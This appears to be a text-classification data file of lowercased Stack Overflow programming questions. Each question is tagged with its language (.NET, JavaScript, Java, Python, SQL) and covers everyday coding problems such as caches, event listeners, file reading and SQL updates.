attaching meta-information to an object in .net  i m pretty sure this is a duplicate question  but i can t find the original(s).    i am getting some objects that i need to  attach  some information to. basically  if that object ever gets back to the same piece of code  i need to see that i have seen it before.    ie. something like this:   <pre><code>dictionary&lt;weakreference&lt;objecttype&gt;  string&gt; _cache; </code></pre>   note the weak reference in there (i know weakreference is not generic btw)  i need to make the key of the cache a weak reference  to handle the fact that the objects are gc ed out of my control.    now  i can make that cache full of weak references  but i seem to recall a similar type of system already existing in .net  which was gc ed automatically alongside the object.    note that i do not recall the overhead of this  so i will make sure to read up on the subject before deciding if this is a good/better solution than my own cache. unfortunately i cannot change the object in question  so i need to keep track of this meta-information somewhere else.    my limitations:   <ul> <li>the object is not mine  so i cannot change it in any way possible</li> <li>i cannot inherit from the object  as it is sealed  besides  i m <em>given</em> the objects  i do not construct them  so i would have to be able to replace an instance with a new object of a descendant type for this to be useful</li> <li>the objects are gc ed out of my control  so i cannot just use a dictionary  which will slowly fill up  either with  references  to nonexistant objects  or will hold on to the objects  i would need a dictionary with a weak referenced key (thus: custom dictionary)</li> <li>the objects  although i could encapsulate them within my own code and thus carry alongside it the required information  is passed back to a framework out of my control  and given back to me from the same  and thus i need to be able to retrieve/look up the old information with just the object in question</li> </ul>   basically  something like:   <pre><code>propertyattacher.attach(instance   name   name); </code></pre>   do i remember correctly  what are the classes involved,.net

how would i use javascript to retrieve text from a different website   disclaimer: please excuse the religious aspects of this post.    anyway  the title says what i m looking for essentially. i m writing a program to find bible references on a page  then display the actual verse in a tooltip upon mouseover of the reference.    i m hoping to get permission from this site eventually. now  i ve done research and i learned about the  same origin policy ; but as far as i can tell this doesn t really apply because i m not trying to call functions/methods from javascript on that site.    all i want to do is grab a verse off of the page. i thought this site would be convenient because it will mark individual verses with the correct url like so: <a href= http://www.drbo.org/x/d b=drb&amp;bk=47&amp;ch=16&amp;l=18  rel= nofollow >http://www.drbo.org/x/d b=drb&amp;bk=47&amp;ch=16&amp;l=18</a>. i ve tried loading this up in an iframe but i couldn t for the life of me get hold of the the <code>&lt;span&gt;</code> element with <code>class= highlight </code> which is  by chance  the only span on the page.    the attempt i just made today was to use jsonp in the form of:   <pre><code>function crossedfingers(variable) {     alert(variable); }  var scr = document.createelement( script ); scr.setattribute( type    text/javascript ); scr.setattribute( charset    utf-8 ); scr.setattribute( src    http://www.drbo.org/x/d b=drb&amp;bk=47&amp;ch=16&amp;l=18&amp;callback=crossedfingers );  document.getelementsbytagname( head ).item(0).appendchild(scr); </code></pre>   i also had a version where i had   <pre><code>function crossedfingers() {     alert( hi ); } </code></pre>   just to see if the function actually got called and it didn t. i m using wamp and i have these files in the www directory  but i m not sure that should effect it. any help would be appreciated  sorry if this in an inappropriate question!    i ve just been frustrated. @_@,javascript

replaceall with string builder with user input  i have a question regarding stringbuilder. i m trying to write a program that takes the user input : for example  dog dog cat dog dogcat   then asks the user to input a word they would like to change and what they would like to change it to. it should then replace all occurrences and print the result.    i have a code:   <pre><code>public class changesentence  {     public static void main(string[] args)      {         scanner sc = new scanner(system.in);         system.out.println( write text:  );         string text = sc.nextline();         stringbuilder x = new stringbuilder(text);         system.out.println( write which word would you like to change:  );         string rep = sc.nextline();         system.out.println( for what do you want to change it:  );         string change = sc.nextline();         system.out.println(pattern.compile(x.tostring()).matcher(rep).replaceall(change));     }  } </code></pre>   how should i change it to achieve the result     thanks!    **forgot to mention  i need to use the stringbuilder (without it i know how to write it).,java
filter array of objects using a list of desired key values  i have an array of objects that might look like this:   <pre><code>var arr = [{   a: 1    b: 321    c: 556    d: 8 }  {   a: 1    b: 22    c: 21    d: 8 }  {   a: 1    b: 1    c: 43    d: 8 }  ]; </code></pre>   and another list that could be:   <pre><code>var list = [ a    c    d ]; </code></pre>   since my list only has keys a  c  and d i want to get rid of all instances of the <code>b</code> key on my original array. all this procedure has to be dynamic though because there is no way for me to know what those keys might be prior to receiving them.    is there a nice and clean way of doing this in javascript,javascript

call function once and detatch itself  i want to implement in pure javascript the following    a button  when clicked  calls a function    <pre><code>&lt;button id=  mybutton   onclick= onlyonce() &gt;hit me&lt;/button&gt; </code></pre>   <code>onlyonce</code> sets some vars and calls another function. then <code>onlyonce</code> detaches itself from the button and the other function adds it self on the button  so now its called with every click    i cannot make it work    here is the code   <pre><code>&lt;button id=  mybutton   onclick= onlyonce() &gt;hit me&lt;/button&gt;  function onlyonce() {     console.log( onlyonce called! );     //do some code...     otherfunction();     document.getelementbyid( mybutton ).addeventlistener( click   otherfunction  false);         document.getelementbyid( mybutton ).removeeventlistener( click   onlyonce  false);   }  function otherfunction() {     console.log( otherfunction called! ); } </code></pre>   when i hit the button the first time  i see <code>onlyonce called!</code> and <code>otherfunction called!</code>  so this is correct.    when i continue to hit the button i still see <code>onlyonce called!</code> and <code>otherfunction called!</code>  so this is wrong because <code>onlyonce</code> did not detached itself. how do i fix this      thanks,javascript

restart an application on crash  i need to restart my application if an unhandled exception occurs. i d like to mimic office applications like word or even visual studio which  when an application crashes or hangs (stops responding)  shows a pop-up and asks the user whether he d like to restart the app or kill it.    i m not sure how it s done since it s possible that my app has completely and utterly crashes (as explained <a href= https://stackoverflow.com/questions/10282012/exception-on-native-thread-crashes-net-application-without-exception >here</a>). right now i thinking some form of watchdog or launcher app  but my gut tells me that this isn t the way the applications i mentioned do it.    so any light on the  best  or  mostly accepted  way of doing it would be greatly appreciated.    as always  thanks all for the attention.,.net

how javascript framework have own workspace  <blockquote>    <strong>possible duplicate:</strong><br>   <a href= https://stackoverflow.com/questions/7719189/javascript-create-incode-workspace-framework >javascript create incode workspace (framework)</a>    </blockquote>     in the last few days i have been interesting in how javascript framework have they own workspace   what i mean is how they can call a variable at any name they want and work with it without involving local variables.    i m writing now an api and i m facing the problem of the local variables / function local names   if they already exist.    so   what i have done is looking into how framework works and i saw they use namespace functions like this :   <pre><code>(function(){ .... })() </code></pre>   so i tried to do something alike   <pre><code>&lt;html&gt;    &lt;head&gt;     &lt;script type= text/javascript &gt;       (function() {         function f(toalert) {  alert(toalert);  }       })();     &lt;/script&gt;   &lt;/head&gt;   &lt;body&gt;      &lt;script&gt;       toalert( hi );     &lt;/script&gt;    &lt;/body&gt; &lt;/html&gt; </code></pre>   but it s not working..    so i have few questions :   <ol> <li> how to have a workspace in javascript to set any variable name i want (if function too it would be great). </li> <li> i saw that the frameworks uses  window  command   is it have something to do with the namespace function to  public  the function or w/e  </li> <li> i ll be glad if you can give me information / tutorials about all this thing   how to make it done from beginning to ending  </li> </ol>,javascript

where can i find documentation to support this behavior   i m looking over some previous developers code and i come across this line:   <pre><code>location.href =  #  + variable; </code></pre>   which has the effect of updating <code>location.hash</code>. remove the  #  and of course it redirects to the non-existent url. playing around a bit it seems i can set the hash via <code>location.href</code> as long as the value starts with  # . this line or similar is used a lot  but i can t seem to find any documentation the supports this behavior of it updating <code>location.hash</code> by setting <code>location.href</code> this way.     i would like to see something showing this isn t just a happy accident that this works so i don t have to re-code all the situations where this is used. anything you can link me to would help.     would it be better to just changes these to properly set the <code>location.hash</code> anyway     thnks,javascript
having serious issues reading input from a .txt file  at the moment in my programming course we are learning about i/o streams. unfortunately my teacher has decided not to come to the past two labs  and has canceled the last lecture  leaving my class and me on our own for learning the basics of i/o streams for our latest assignment.    for our latest assignment we are to read information from a text file  <code>listofairlines.txt</code>  and store them inside of three different classes (location  designator  and airline). the airline class is to have objects of both the location and designator classes.     the problem is that my program does nt seem to want to read the input from the file. here is my code for the program so far. it s not done  but i tried testing out what i have so far just to see if it works. every time i run it  the catch block is the only part that runs despite me typing in the exact file name. i m also getting a runtime error saying that there is an issue on line 39 (where the for loop starts). i really have no idea what i m doing and i ve mostly just been trying to follow examples in my book for this particular program.   <pre><code>import java.io.file; import java.io.filenotfoundexception; import java.util.scanner;  public class airlineoutput {     public static void storeinfo() {         airlineinput object = new airlineinput();         string file = airlineinput.enterfilename();         scanner inputstream = null;          try {             inputstream = new scanner(new file(file));         } catch (filenotfoundexception z) {             system.out.println( error opening the file  +file);         }          /*          * the following creates an array for every object in the program.          * it cycles through the input stream assigning each line to a string   variable.          * the string variables are then passed through to their respective object classes.          * the location and designator objects are passed to the airline object as the          * airline object is required to contain it s own location and designator objects.          */         for (int i = 0; inputstream.hasnextline(); i++) {             airline[] airline = new airline[i];             airline[i]=new airline();              designator[] designator = new designator[i];             designator[i]=new designator();              location[] location = new location[i];             location[i]=new location();              string stringread = inputstream.nextline();             scanner parse = new scanner(stringread);              string airlinename = parse.next();             string designators = parse.next();             string frequentflyerprogram = parse.next();             string city = parse.next();             string state = parse.next();             string country = parse.next();             string website = parse.next();              location[i].setcity(city);             location[i].setcountry(country);             location[i].setstate(state);             airline[i].setlocation(location[i]);              designator[i].setdesignators(designators);             airline[i].setdesignators(designator[i]);              airline[i].setname(airlinename);             airline[i].setwebsite(website);             airline[i].setfrequentflyer(frequentflyerprogram);}             inputstream.close();         }     } } </code></pre>   the .enterfilename() is under the the input class that we are required to have. it s just to ask the user for the filename which is then stored in a string.   <pre><code>import java.util.scanner;  public class airlineinput {     static string file;      public airlineinput() {      }      public static string enterfilename() {         system.out.println( enter the file name:  );         scanner keyboard=new scanner(system.in);         file=keyboard.next();          return file;         } } </code></pre>,java

getting directory of program when called from a different application  i have program1 on my desktop. program1 is supposed to open program2. i have program2 in \folder1\folder2.     so everything looks like this:    program 1 = on desktop    program 2 = \folder1\folder2\program2.exe    i m using this code in program1 to open program2:   <pre><code> process.start( z:\folder1\folder2\program2.exe ) </code></pre>   so  once program2 is open  it is find the path of a file that s contained in folder1 using this code:   <pre><code> dim path as string= system.io.directory.getparent(environment.currentdirectory).tostring() </code></pre>   so we open program1. program1 opens program2. program2 opens a file one directory down  in folder1.    when i execute program2 directly  everything works. however  when i launch program1  it opens program2 which for whatever reason  thinks that the directory is that of program1.    any ideas,.net

calling an event just once in a for loop  been trying to tackle this problem for a couple of hours  and i can t seem to find a solution.    basically  i have an audio player  using html5. there is an event listener while the audio is playing  which fires every second until the audio is finished.    i generate markers on the audio timeline based on the timestamp given by the api  it looks like this.    <a href= https://i.stack.imgur.com/jcubg.jpg  rel= nofollow noreferrer ><img src= https://i.stack.imgur.com/jcubg.jpg  alt= enter image description here ></a>    there are three markers placed here - if the total duration was 60 seconds  the markers would be at 5  10  29 i suppose.    after each marker  i need to change the image and a paragraph text from the api on the dom  and i use jquery to do this.    inside the  timeupdate  listener  i have a for loop which goes through each marker on the dom  then it checks to see if the  currenttime  of the audio object  is less than the  timestamp .   <pre><code> audioobject.addeventlistener( timeupdate   () =&gt;  {      for (let i = 0; i &lt; $(options.markers).length; i++)      {          // if the current time of the audio is greater than the first timestamp second  continue          if (options.audioobject.currenttime &gt; options.podcastdata[i].timestamp)          {              options.coverimage.attr( src   options.podcastdata[i].image);              options.thetitle.text(options.podcastdata[i].name)          }      }   }  false) </code></pre>   now this works  but it updates the dom every second  so i see flashes on the inspector element until the podcast is finished.    what i need is to update the dom only once when it has past a marker  but at the moment i can t seem to find a way to do this.,javascript

strange behaviour on checking condition in javascript  i am writing a code to draw a hexagonal mesh using svg on the screen the reason i have use a single hexagon instead of a pattern is that i eventually want to make every single hexagon a object to reference to    i have sort of drawn the hexagons using some math and point references.     so instead of making this complicated then it really is by trying to explain my code  here is my code <a href= https://jsfiddle.net/snedden27/9nnrt7hp/8/  rel= nofollow >https://jsfiddle.net/snedden27/9nnrt7hp/8/</a>      my problem is  <strong>function drawhexaround(cent)</strong>//line 41   the function is suppose to draw hexagon around the hexagon with centroid  @cent     here is the checking condition:   <pre><code>if (!contains(drawncentroids centroidnew)) {     makehex(centroidnew);     drawncentroids.push(centroidnew); } </code></pre>   and here is the function   <pre><code>function contains(a  obj) {     var l = a.length;      for (var i=0;i&lt;l;i++) {         // console.log(a[i] obj);         // console.log(a[i] === obj);          if (a[i] === obj) {             // console.log( true );             return true;         }     }      return false; } </code></pre>   it draws the hexagons alright  but it draws over existing hexagons as well inspite of me checking for the condition with <code>contains(a obj)</code>    i don t understand why this condition result is always true when clearly it should result in false in some cases.,javascript

how to improve simple sql query by using where exists statement   could you please help me out on improving simple query below. based on a last modified date (ods_change_date)  i set a  ods_change_flag  to  y  if it was modified in the last two months (done in previous query not shown here).    then i want to set a reload_indicator flag to  y  for all records that were created in those months (based on creation_date). this way i can send all records of those months where at least 1 record was modified in the past two months.    the query below does the trick but i believe it can be optimised using a where exist statement but i am not familiar with it and i can not get it to work for the example below. would you be willing to help me out so i can do it in one statement without using temp table      thanks!   <pre><code>use ods  update ods_dcf_output set reload_indicator =  n    drop table #dcf_output_changed  select concat(datepart(year  creation_date) datepart(month  creation_date)) as reload_month_codes  into #dcf_output_changed  from ods_dcf_output  where ods_change_flag =  y   update ods_dcf_output  set ods_dcf_output.reload_indicator =  y   from ods_dcf_output as a  inner join #dcf_output_changed as b on b.reload_month_codes = concat(datepart(year  a.creation_date) datepart(month  a.creation_date)) </code></pre>,sql
elegant way of grouping attributes  i want to group attributes of instances of a class  so that it would be easy to iterate through all the attributes belonging to a group. the obvious answer would be to put all these into a list or dict  but then i wouldn t be able to access them as attributes of my object  and i would prefer that.    some code should make it clear what i want. here i actually have a list and real attributes.   <pre><code>class vectors(object):      def __init__(self  v1  v2  v3):         self.v1 = v1         self.v2 = v2         self.v3 = v3         self.rotatable = [ v2    v3 ]      def rotate(self  angle):         for v in self.rotable:             new_vector = do_rotate(getattr(self  v)  angle)             setattr(self  v  new_vector)  class morevectors(vectors):     def __init__(self  v4  *args  **kwargs):         super(morevectors  self).__init__(*args  **kwargs)         self.v4 = v4         self.rotable.append( v4 ) </code></pre>   now when calling <code>rotate()</code> it know what vectors to rotate and i can add more vectors to that list dynamically. however  while this does its job  it doesn t look that elegant to me as i have to manage the list by myself.    is there some simpler way to write this  i thought about storing all attributes in a dictionary  where each group is a key  and then use <code>properties()</code> to let me access all  items of the dictionary as attributes. that would be clean enough for me  but i don t know how to set properties dynamically inside a method.,python

how to share single class between multiple classes  what is the best way to share a class <code>a</code> between two or more other classes <code>b</code> and <code>c</code>.    for example in file <code>a.py</code>:   <pre><code>class a(object):      def __init__(self):         self.file = open( filename    a )      def __del__(self):         self.file.close()      def write(self  text):         print(text  file=self.file) </code></pre>   which is used for logging results. for obvious reasons i only want to load the file a single time and have all other classes access this single class to write to the files.    then there is class <code>b</code> in file <code>b.py</code>:   <pre><code> from a import a   class b(object):       def __init__(self):           self.a = a.a() </code></pre>   then there is class <code>c</code> in file <code>c.py</code>:   <pre><code> from a import a   class c(object):       def __init__(self):           self.a = a.a() </code></pre>   the problem is that it seems that if i m using inheritance it would not work well if there are multiple files of this sort than need to be included in multiple other classes. what is the best practice for including a general helper class in all other classes  while only loading it a single time,python

is there a way of retrieving the specific lines of code for some sort of callback function   i am in the middle of a project which basically allows other users to install  add-ons  for my script. in general it will be something like the following:   <pre><code>function widget () {    this.addcontrol = function (type control) {      control.call({ object with some un-thoughtout vars });    } } </code></pre>   <em>very basic example with pretty much everything removed</em>    the users who will be using this trust myself fully. now i want to make sure any scripts other people make will be ran with limited permissions. so they can t hijack sessions or redirect the user or upright steal their passwords/keystrokes.     i looked at a few results on google and they basically suggest that you shouldn t really do this as its more trouble than its worth. but in my opinion i d much rather limiting it than someone installing a widget that takes their information (which they more than likely will). so does anyone know of a way of breaking down the callback function into individual lines of code so i can check everything s fine before allowing it to run      or will i have to go down some horrid string then <code>eval</code> method,javascript

deduplication algorithm logic  could you please help me find the error in my logic  the function doesn t work well and i can t figure out why. the instructions are: write a function remove_duplicates that takes in a list and removes elements of the list that are the same. do not modify the list you take as input! instead  return a new list. for example: remove_duplicates([1 1 2 2]) should return [1 2].    for [1  2  2  5  5  5  7  7] i m getting this output [1  2  5  7]  which is good. however  for [4  9  9  4] the output is [9  9  4]  which is wrong. i can t find out what the problem is. i started learning programming a few weeks ago  so i m a novice. thanks!    my code:   <pre><code>def remove_duplicates(l):     nl = list(l)     i = 0         while i &lt;= len(nl)-2:         j = i + 1         while j &lt;= len(nl)-1:             if nl[i] == nl[j]:                 nl.remove(nl[j])             else:                 j += 1         i += 1     return nl </code></pre>,python

python - any way of checking if number 0 or false  if i were to set a variable as false  it is read as being equal to zero. is there any way i can carry out a check to see if the variable if actually false or if it s the number 0.    something like:   <pre><code>spam = false  if spam == false and not spam == 0:     do something </code></pre>   i m getting the feeling this isn t possible; but i wanted to double check.     side note: in the future would it be better to assign  none  rather than  false  when a variable could be zero  for the current code i don t want to have to rework the whole script with try and excepts  so i ll change false to -1 (not a viable value for the situation). but for future reference  i assume the none method is more pythonic     help as always is appreciated and if any more details are needed  just ask.,python

.net: is there a way to read a txt file from bottom to top  <blockquote>    <strong>possible duplicate:</strong><br>   <a href= https://stackoverflow.com/questions/452902/how-to-read-a-text-file-reversely-with-iterator-in-c >how to read a text file reversely with iterator in c#</a>    </blockquote>     i am wondering if there is a way to read a text file from bottom to top without any performance penalty  the readline  movenext approach  but reversed  is this sort of thing possible in .net     to make matters more interesting the text file has around 100 000 lines in it  so i can t cheat with a readall  reverse...    some more detail: i have a collection of incoming string values that is prefixed with an int id that can be sorted. unfortunately i get these ids in the wrong order. the main issue is the sheer volume of the string values  and no rdbms in the solution. so i really need a way to store the string values and then reverse the order of the storing during the processing. text file came to mind because i don t have a better solution at this point in time.    thanks in advance.,.net
why does setinterval initiate when i m only assigning it   i m assigning to a variable  a function that uses setinterval  but i don t want the function to run until i call it. however  the function is running from just the assignment statement.   <pre><code>sessionclock = setinterval(function() {   console.log( hi ) }  1000) </code></pre>   i have also tried like this:   <pre><code>sayhi = function() {   console.log( hi ); }  var sayhistarter = setinterval(sayhi  1000); </code></pre>   both of these initiate the function and will log  hi  to the console.    why is it running on assignment  and what can do i do fix this,javascript
using radio buttons with javascript... getting null error  what i am trying do is  have 4 radio buttons that depict a math operation (add  subtract...) then based off of which one is checked  i will take the user entered numbers and perform the calculation. to do this i used an if else statement  so that it runs through the buttons and if it is checked it will perform the math operation. the problem i m getting is a null error.    <em>document.getelementbyid(...) is null...if(document.getelementbyid( add ).checked)</em>    i get this same error no matter which radio button is selected. another issue i have is multiple radio buttons can be selected at once.    how can i code this so that only one button can be selected  and then depending on which button is checked perform that operation  why am i getting the null error     i was under the impression that if the radio button was selected then document.getelementbyid( add ).checked would return true other wise it would return as false moving to the next statment.    <strong>html</strong>   <pre><code>    &lt;form&gt;         enter two numbers  select a math  click the button to see result.         enter first number: &lt;input type= number  id= num1 &gt;         enter second number: &lt;input type= number  id= num2 &gt;             &lt;h5&gt;select a math&lt;/h5&gt;         &lt;input type= radio  name= add &gt;add&lt;br&gt;         &lt;input type= radio  name= sub &gt;subtract&lt;br&gt;         &lt;input type= radio  name= multi &gt;multiply&lt;br&gt;         &lt;input type= radio  name= divis &gt;division&lt;br&gt;         &lt;br&gt;         &lt;button type= button  onclick= calculate(); &gt;calculate&lt;/button&gt;     &lt;/form&gt;     &lt;p id= result &gt;&lt;/p&gt; &lt;/div&gt; </code></pre>   <strong>javascript</strong>   <pre><code>function calculate(){     var num1 = document.getelementbyid( num1 ).value;     var num2 = document.getelementbyid( num2 ).value;     var res = document.getelementbyid( result ).innerhtml;      if(document.getelementbyid( add ).checked){         res = num1 + num2;     }else if(document.getelementbyid( sub ).checked){         res = num1 - num2;     }else if(document.getelementbyid( multi ).checked){         res = num1 * num2;     }else if(document.getelementbyid( divis ).checked){         if(num2 == 0){             alert( can not divide by zero!! );         }else{             res = num1 / num2;         }     }else{         alert( please select a math );     }  } </code></pre>,javascript

beginner java: returning values from methods  before i begin i d like to state that i m very much a beginner when it comes to writing code in general so i do apologise if what i m asking may seem extremely basic.    with that being said i m struggling with returning methods in my code. i am able to write this program without splitting it into methods as i have but i am told that when coding it is good practice to split it up in methods so that debugging can be easier.    the following code seems to have a few major flaws.    <pre><code>public static boolean hybridnot() {   string typecar = input( hybrid or electric  );   boolean electric = false;   if (typecar.equalsignorecase( electric ))  {     electric = true;  }   else if (typecar.equalsignorecase( hybrid ))  {     electric = false;  }   else  {     print( sorry i didn t understand that );  }   return; }  public static boolean solarnot() {    string panelsmaybe = input( solar panel  );    boolean solarpanel = false;     if (panelsmaybe.equalsignorecase( yes ))    {       solarpanel = true;    }     else if (panelsmaybe.equalsignorecase( no ))    {       solarpanel = false;    }     else    {       print( sorry i didn t understand that );    }     return;   }   public static int discountnot() {     final int basicprice = 20000;     final int electriccost = 2000;     final int solarcost = 5000;     boolean electric = hybridnot();     boolean solarpanel = solarnot();     int totalprice;      if ((solarpanel = true) || (electric = true))     {        totalprice = basicprice + solarcost + electriccost - 500;     }      else if ((solarpanel = true) || (electric = false))     {        totalprice = basicprice + solarcost;     }      else if ((solarpanel = false) || (electric = true))     {        totalprice = basicprice + electriccost;     }      else     {        totalprice = basicprice;     }      return;     }  public static void totalcost() {    final int basicprice = 20000;    final int electriccost = 2000;    final int solarcost = 5000;    final int discountcost = 500;    boolean hybrid = hybridnot();    boolean solarpanel = solarnot();    int finalprice = 0;     finalprice = discountnot();     if (finalprice &gt;= 26500)    {       print( basic price:   + basicprice +  \n  +  electric model:   +  electriccost +  \n  +  solar panel:   + solarcost +  \n  +  discount:   + discountcost);    }     else if (finalprice &gt;= 25000)    {       print( basic price:   + basicprice +  \n  +  solar panel:   + solarcost);    }     else if (finalprice &gt;= 22000)    {       print( basic price:   + basicprice +  \n  +  electric model:   + electriccost);    }     else    {       print( basic price:   + basicprice);    }     print( total:   + finalprice);     } </code></pre>   for some reason the methods hybridnot and solarnot seem to repeat themselves before moving on to the next method. to me it seems that i might have a problem with what i m returning at the end of the method but i honestly can t figure out what s wrong. the method totalcost seems to ignore the if statement in the method discountnot and the boolean values aren t passed correctly to totalcost and i only get the the value when <code>finalprice &gt;= 26500</code>.    again  i m new to java in general and i m also new to stackoverflow (so hi!!) so please tell me if i m doing something wrong and i ll look to correctly next time round! thank you!!,java

is there any way to force a class to be loaded at runtime  i have a situation where i have a registry class to which certain classes have to register themselves for the system. since i m writing an api i can t necessarily know which these classes are before runtime  so my solution is using a static block within each class for it to register itself.    the problem is of course that the static block isn t run until each class is initialized  and because there are no explicit references to each individual class  they never are initialized. catch-22.     so  is there any way or annotation to make sure that a class is initialized at startup without referring to it explicitly,java

why does inline if assignment requires else statement  <pre><code>x =  foo  if x ==  bar  else x </code></pre>   now this would be equal to :   <pre><code>x =  foo  if x ==  bar   </code></pre>   but this returns  invalid syntax  error. is there a reason why this works like it does or what s the reason behind the design decision  because it s how multi-line if function is (functions like example #2):   <pre><code>if x ==  foo :     x =  bar  </code></pre>   and it works perfectly fine.,python

need sql statement that computes values base on positive or negative column value  i m using sql server and looking for a statement that that each row will contain a computed number based on whether the column value is positive or negative.      for example  i have this data:   <pre><code>**field_1**  23.0 -12.0  14.0  -4.0 </code></pre>   if field_1 is positive the column value is multiplied by 0.50.   if the value is negative  it is multiplied by -0.25.   so in this example  the results would look like:   <pre><code>**computed** 12.5  4.0  7.0  1.0 </code></pre>   i m struggling with how to distinguish between positive and negative value to apply the correct factor of 0.50 or -0.25.  something like this:   <pre><code>    select field_1 * (0.50 if field_1 &gt;+0 or -0.25 if field_1 &lt; 0) as computed from table </code></pre>   any ideas     thanks!,sql
naming a  core  assembly  i know that this is somewhat subjective  but i wonder if there is a generally accepted standard for naming assemblies which contain some  core  functions.    let s say you got a larger projects  with assemblies like   <ul> <li>company.product.webcontrols.dll</li> <li>company.product.net.dll</li> <li>company.product.userpages.dll</li> </ul>   and you have a bunch of  core  classes  like the global error handler  the global logging functionality etc.    how would such an assembly generally named  here are some things i had in mind:   <ul> <li>company.product.dll</li> <li>company.product.core.dll</li> <li>company.product.global.dll</li> <li>company.product.administration.dll</li> </ul>   now  while  just pick one and go on  will not cause armageddon  i d still like to know if there is an  accepted  way to name those assemblies.,.net

why does this javascript variable produce a syntax error   i have a simple javascript variable  filled with a string. within the string  there are more than 400 double quotes  so to make it valid (or at least  what i thought would be valid)  i ve encased it in single quotes. however  this still seems to return a syntax error  both in my dreamweaver code console  and using jslint on my jsfiddle.    could anyone explain why this produced a syntax error     <strong><a href= http://jsfiddle.net/cqpka/  rel= nofollow >link to jsfiddle</a></strong>   <pre><code>var options =  &lt;option value= 0 &gt;select country&lt;/option&gt;

determine if a string is unique  without using any functions or extra variables  given a string as input  i need to print saying weather the string is unique or not.  i cannot use any extra variables  nor can i use functions other than join and append.    for instance  given the input   <pre><code> hello world  </code></pre>   since the l repeats  therefore this string is not unique and the output should be   <pre><code>this string is not unique </code></pre>   i have also tried to  use this    <pre><code>user = raw_input( enter a string:  ) for i in range(o  entered.length()):     if entered[i] == entered[i+1]         print  this string has repeats      else:         print  this string is unique         </code></pre>   so the point of this code was to check if the first index will equal any other indexes but i know i did something wrong that s why its not working . the mentality was to check if    <pre><code>entered[1] = entered[2] </code></pre>   then it would check    <pre><code>entered[1] = entered[3] </code></pre>   and so on and so forth,python

javascript dynamically set width based on number in class name  i have a table and within each cell with reside one single div with a class that is prefixed with <code>perc-</code> and will contain on number ranging from 0 to 100. for instance <code>perc-60</code> which would equate to 60%.     i can do this in css by generating a sass loop and processing 100 variants on the <code>perc-</code> class. for purposes of learning i d like to know how i can achieve an inline style via javascript where by i can set the width of the div based on the number in the class. the numbers get applied via a backend system out of my control  but will related to some data from the user.     example markup:   <pre><code>&lt;table&gt;     &lt;tr&gt;         &lt;td class= perc-60 &gt;&lt;div&gt;&lt;/div&gt;&lt;/td&gt;     &lt;/tr&gt;     &lt;tr&gt;         &lt;td class= perc-15 &gt;&lt;div&gt;&lt;/div&gt;&lt;/td&gt;     &lt;/tr&gt;     &lt;tr&gt;         &lt;td class= perc-45 &gt;&lt;div&gt;&lt;/div&gt;&lt;/td&gt;     &lt;/tr&gt;     &lt;tr&gt;         &lt;td class= perc-16 &gt;&lt;div&gt;&lt;/div&gt;&lt;/td&gt;     &lt;/tr&gt;     &lt;tr&gt;         &lt;td class= perc-88 &gt;&lt;div&gt;&lt;/div&gt;&lt;/td&gt;     &lt;/tr&gt;     &lt;tr&gt;         &lt;td class= perc-79 &gt;&lt;div&gt;&lt;/div&gt;&lt;/td&gt;     &lt;/tr&gt;     &lt;tr&gt;         &lt;td class= perc-98 &gt;&lt;div&gt;&lt;/div&gt;&lt;/td&gt;     &lt;/tr&gt; &lt;/table&gt; </code></pre>   at the moment i use a sass loop to go through all the classes and target the divs width within the <code>td</code>.,javascript

queryselector returns string instead of dom-element  i tried to parse the color-names on this page: <a href= http://www.google.com/design/spec/style/color.html#  rel= nofollow >http://www.google.com/design/spec/style/color.html#</a>    using this code:   <pre><code>var all = document.queryselectorall( .color-group );  for(var i=0; i&lt;all.length; i++){     var e = all[i];     var name = e.queryselector( span.name );     console.debug(name.innerhtml); } </code></pre>   however the printed result is always <code>undefined</code>.    this slightly changed code however works:   <pre><code>var all = document.queryselectorall( .color-group );  for(var i=0; i&lt;all.length; i++){     var e = all[i];     var name = e.queryselector( span.name ).innerhtml;     console.debug(name); } </code></pre>   the only difference is that i access the result of <code>queryselector</code> directly and not via the <code>name</code>-variable.    i tried it with chrome  safari and firefox which all did not return the color-names. ie however manged to get it right this time.    is this a general bug or feature or is it a problem with the website,javascript

identifying the most purchased combination of items in sql  first of all  i hope everyone s staying safe out there. <br /> so here s my question. <br /> currently i m trying to figure out how i can identify the most purchased combination of items. <br /> most purchased combination of items must appear at the top (descending order is crucial).   let s say i have a sales table that looks like this:  <pre><code>cust_id   item_id 100       a 100       a 100       b 100       c 200       a 200       c 200       c 300       b 400       a 400       b </code></pre>  and the expected output looks something like this:  <pre><code>comb_of_item   count_of_cust a  b           10 a  c           7 b  c           4 a  b  c        2 </code></pre>  note that customer 100 had purchased item &quot;a&quot; twice  which for the purpose of this exercise will be ignored (dups to be removed). <br /> this means that customer 100 would be counted as &quot;a  b  c&quot; not &quot;a  a  b  c&quot; <br /> any help/suggestion would be much appreciated. <br />   many thanks advance!,sql

create an object based on user interaction  i m trying to figure out how to create a new object based on user input. i have been googling this for ages and can t find a solution. essentially i want my program to spit out records already contained in the program and then offer the user an option to add a new record using a switch statement. so far i have:   <pre><code>import java.util.scanner; public class retailitemdrive {      public static void main(string[] args) {         //define the variables         string itemdescription;         int itemunits;         double itemprice;           //create scanner class         scanner keyboard = new scanner(system.in);          //create new objects          retailitem item1 = new retailitem( jacket  12 59.95);         retailitem item2 = new retailitem( designer jeans  40 34.95);         retailitem item3 = new retailitem( shirt  20 24.95);          system.out.println( itemno.  description     quantity  price );          system.out.println( item1      + item1.getdescription() +              + item1.getunitsonhand() +             + item1.getprice());          system.out.println( item2      + item2.getdescription() +      + item2.getunitsonhand() +             + item2.getprice());          system.out.println( item3      + item3.getdescription() +               + item3.getunitsonhand() +             + item3.getprice());      } } </code></pre>   what i would like to be able to do is then offer the user the option to close the program or add a new record  if they choose to add a new record i will use a switch statement and this is where my issue starts.    what i m trying to figure out is how to add values to the 3 variables and then input them into a new object that increments each time.    i.e.     enter description  enter units  enter price    retailitem item(increment+1) = new retailitem(var des var units  var price)    hope this makes sense,java

why is a function wrap unside a function object not called in javascript  i have javascript function as object:   <pre><code>function hexmesh(){      var side=25;      console.log( hexmesh );       function drawover(){      } }   </code></pre>   as you can see it has a function call <code>drawover</code>.     i try to call it by using a constructor as follows:    <pre><code>window.onload = function() {     hexmeshobj=new hexmesh();     hexmeshobj.drawover(); } </code></pre>   but it gives me error saying <code>undefined is not a function</code>    now i know i could declare the function in the prototype of the object but i don t want to do that.     here it is on <a href= https://jsfiddle.net/snedden27/z4xfy6n8/  rel= nofollow >jsfiddle</a>.,javascript
